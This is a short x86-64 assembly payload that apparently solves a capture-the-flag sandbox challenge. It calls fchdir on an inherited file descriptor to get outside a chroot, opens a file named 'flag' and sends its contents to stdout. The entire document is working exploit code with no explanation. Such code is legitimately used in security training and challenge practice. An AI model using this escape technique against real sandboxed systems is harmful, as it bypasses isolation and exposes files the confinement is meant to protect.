.global _start
_start:
.intel_syntax noprefix

    mov rax, 0x51
    mov rdi, 0x3
    syscall

    mov rax, 0x2
    lea rdi, [rip+flag]
    mov rsi, 0
    syscall


    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x300
    syscall

    
flag:
    .ascii "flag\0"
